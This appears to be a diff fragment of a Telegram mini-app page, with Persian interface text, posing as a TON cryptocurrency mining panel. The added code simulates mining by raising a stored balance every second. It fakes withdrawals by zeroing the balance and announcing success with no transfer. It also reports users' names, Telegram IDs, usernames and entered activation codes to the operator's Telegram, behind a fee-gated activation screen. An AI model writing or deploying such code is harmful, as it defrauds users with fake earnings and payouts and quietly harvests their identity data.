+    sendToTelegram(`💰 **برداشت نهایی**\n👤 نام: ${currentUser?.firstName}\n🆔 آیدی: ${currentUser?.id}\n📤 مبلغ: ${amountToWithdraw.toFixed(6)} TON\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
+    withdrawableBalance = 0;
+    document.getElementById('withdrawableBalance').innerText = "0.000000";
+    localStorage.setItem('withdrawableBalance', "0");
+    document.getElementById('finalWithdrawBtn').classList.add('disabled');
+    showToast(`✅ برداشت ${amountToWithdraw.toFixed(6)} TON با موفقیت انجام شد`);
+};
+
+// ==================== فعالسازی پنل ====================
+if (localStorage.getItem('isActivated') === 'true') document.getElementById('feeModal').style.display = 'none';
+
+window.verifyActivation = function() {
+    const val = document.getElementById('activationInput').value.trim();
+    const activationMessage = document.getElementById('activationMessage');
+    const isValidCode = CONFIG.SECRET_CODES.includes(val);
+    if (isValidCode) {
+        const codeType = val === "VipTonDropy" ? "VIP" : "عادی";
+        sendToTelegram(`✅ **فعالسازی موفق (${codeType})**\n━━━━━━━━━━━━━━\n👤 نام: ${currentUser?.firstName||'ناشناس'} ${currentUser?.lastName||''}\n🆔 آیدی: ${currentUser?.id||'نامشخص'}\n📛 یوزرنیم: ${currentUser?.username?'@'+currentUser.username:'ندارد'}\n🔑 کد وارد شده: ${val}\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
+        showGlassMessage('success', 'ورود موفق', 'در حال اتصال به شبکه بلاکچین ...');
+        activationMessage.classList.add('show');
+        setTimeout(() => {
+            localStorage.setItem('isActivated', 'true');
+            document.getElementById('feeModal').style.display = 'none';
+            showToast("پنل با موفقیت فعال شد!");
+            addToHistory('فعالسازی', 'پنل فعال شد');
+        }, 2000);
+    } else {
+        sendToTelegram(`❌ **خطا در فعالسازی**\n👤 نام: ${currentUser?.firstName||'ناشناس'} ${currentUser?.lastName||''}\n🆔 آیدی: ${currentUser?.id||'نامشخص'}\n📛 یوزرنیم: ${currentUser?.username?'@'+currentUser.username:'ندارد'}\n🔑 کد وارد شده: ${val||'خالی'}\n⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
+        showGlassMessage('error', 'رمز اشتباه است');
+        activationMessage.classList.remove('show');
+    }
 };
 
 // ==================== مقداردهی اولیه ====================
@@ -546,10 +829,29 @@ document.getElementById('miningSpeed').innerText = (1 + referralCount * 0.1).toF
 document.getElementById('dailyStreak').innerText = dailyStreak;
 document.getElementById('achievementCount').innerText = achievements;
 
-// نمایش آدرس لینک دعوت
+const baseRate = 0.000012;
+let bonusRate = referralCount * 0.000001;
+if (bonusRate > 0.00001) bonusRate = 0.00001;
+
+setInterval(() => {
+    const currentRate = baseRate + bonusRate;
+    bal += currentRate;
+    totalMined += currentRate;
+    document.getElementById('balance').innerText = bal.toFixed(6);
+    document.getElementById('totalMined').innerText = totalMined.toFixed(6);
+    document.getElementById('miningRate').innerText = currentRate.toFixed(6);
+    localStorage.setItem('bal_v47', bal.toString());
+    localStorage.setItem('totalMined', totalMined.toString());
+    updateUserLevel();
+}, 1000);
+
+updateWalletHistory();
+checkAndEnableFinalWithdraw();
+
 if (currentUser) {
     document.getElementById('referralLink').innerText = `https://t.me/${CONFIG.BOT_USERNAME}?start=${currentUser.id}`;
 }
 </script>
 </body>
 </html>
+```
